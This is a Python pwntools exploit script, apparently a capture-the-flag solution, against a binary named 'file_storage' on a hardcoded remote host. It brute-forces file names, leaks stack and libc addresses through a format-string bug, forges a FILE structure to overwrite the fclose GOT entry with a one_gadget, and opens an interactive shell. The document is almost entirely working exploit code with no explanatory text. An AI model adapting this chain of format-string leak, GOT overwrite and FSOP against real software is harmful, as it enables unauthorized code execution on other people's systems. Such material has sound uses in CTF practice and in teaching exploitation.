#!usr/bin/python3
from pwn import *
import string

# =========================================================
#                          SETUP                         
# =========================================================
exe = './file_storage'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '157.245.39.76', 32080

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x4056b0
p *(FILE *) $rdi
'''.format(**locals())

def read(filename, type='string'):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'Filename: ', filename)
    msg = io.recv(20)
    
    if (b'Error' in msg):
        io.recvuntil(b'/tmp/')
        return io.recvline()
    else:
        io.sendline(type.encode())
        io.recvuntil(b'(string/number): ')
        return io.recvline()
    
def write(content):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'content:', content)
    
def brute():
    for a in string.ascii_uppercase:
        for b in string.ascii_uppercase:
            filename = f'{a}{b}.txt'.encode()
            info('trying: %s', filename)
            ret = read(filename)
            
            if (filename in ret):
                continue
            else:
                success('found filename: %s', filename)
                return filename
            
def craft_fsop(content, write_addr, _lock, fake_file_addr):
    # will create a arbitrary write primitive,
    # every comment down here will be relative to fprintf call after gets()
    #_lock = 0x405790   (Just a writable address, i.e. stack)  
    
    payload = flat([
        content,                    # $rsp, content to be written
        0xfbad2484,                 # _flags
        0,                          # _IO_read_ptr
        0,                          # _IO_read_end
        0,                          # _IO_read_base
        0,                          # _IO_write_base
        0,                          # _IO_write_ptr
        0,                          # _IO_write_end
        write_addr,                 # _IO_buf_base
        write_addr + 8,             # _IO_buf_end
        0,                          # _IO_save_base
        0,                          # _IO_backup_base
        0,                          # _IO_save_end
        0,                          # _markers
        libc.sym['_IO_2_1_stderr_'],# _markers
        3,                          # _fileno
        0,                          # _old_offset
        0,                          # _cur_column
        _lock,                      # _vtable_offset
        p64(0xffffffffffffffff),    # _shortbuf
        0,                          # _lock
        _lock + 0x10,               # _offset
        0,                          # _codecvt
        0,                          # _wide_data
        0,                          # _freeres_list
        0,                          # _freeres_buf
        0,                          # __pad5
        0,                          # _mode
        libc.sym['_IO_file_jumps']  # _unused2
    ])
    
    offset = 288 - len(payload)
    payload += b'\x00' * offset         # padding to fill 288
    payload += p64(fake_file_addr)   # overwrite FILE structure with fake one we just created
    
    return payload

# =========================================================
#                         EXPLOITS
# =========================================================
# cleaning, making sure brute working to intended file
io = initialize()
io.sendline(b'clearing files')
sleep(6)
io.close()

# storing libc to leak later
io = initialize()
write(str(elf.got['printf']).encode())
sleep(1)
io.close()

# bruteforcing filenames
io = initialize()
filename = brute()
io.close()

# final
io = initialize()

# leaking stack addr
# %tx is a valid format specifier
stck_leak = int(read(b'%1$txt')[:-2], 16)
content_addr = stck_leak + 0x26a0 # runtime

# leaking libc addr
printf = unpack(read(filename, type='number').strip().ljust(8, b'\x00')) # runtime printf
libc.address = printf - libc.sym['printf']

# crafting payload
one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
payload = craft_fsop(libc.address + one_gadgets[1], 
                     elf.got['fclose'],
                     stck_leak,
                     content_addr + 8)

# sending payload
io.sendlineafter(b'(yes/no)', b'yes')
io.sendlineafter(b'content:', payload)

# logging information
info('printf runtime: %#x', printf)
info('libc base addres" %#x', libc.address)
info('stack leak: %#x', stck_leak)
info('content addr: %#x', content_addr + 8)

io.interactive()